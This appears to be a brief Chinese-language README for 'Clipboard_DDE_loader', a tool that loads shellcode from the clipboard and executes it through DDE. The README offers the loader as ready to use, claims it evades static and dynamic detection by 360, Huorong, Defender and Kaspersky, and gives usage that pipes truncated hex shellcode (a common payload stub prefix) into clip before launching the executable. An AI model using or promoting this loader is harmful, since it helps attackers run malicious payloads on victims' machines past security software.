# Clipboard_DDE_loader

生成的剪贴板+DDE组合的加载器，直接用
原理看之前文章吧，64位效果比32位好
静态+动态基本能过360、火绒、def、卡巴等
卡巴斯基内存查杀主要看你shellcode能不能过了

用法：
```
echo fc4883e4f0e8c00000004... | clip
start Clipboard_DDE.exe\
```
